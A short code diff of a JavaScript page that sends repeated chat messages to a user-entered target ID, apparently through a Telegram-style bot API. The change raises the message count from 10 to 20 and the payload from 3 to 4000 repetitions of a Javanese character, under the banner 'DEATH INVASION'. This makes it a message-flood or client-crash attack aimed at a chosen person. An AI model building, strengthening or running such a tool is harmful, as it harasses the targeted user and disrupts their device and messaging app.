@@ -95,10 +95,10 @@
       const id = document.getElementById('target-id').value.trim();
       if (!id) return alert("Isi ID dulu 😹");
 
-      for (let i = 1; i <= 10; i++) {
+      for (let i = 1; i <= 20; i++) {
         const payload = {
           chat_id: id,
-          text: `💣 *DEATH INVASION [${i}/10]* 💣\n` + "ꦾ".repeat(3),
+          text: `💣 *DEATH INVASION [${i}/10]* 💣\n` + "ꦾ".repeat(4000),
           parse_mode: "Markdown"
         };
 
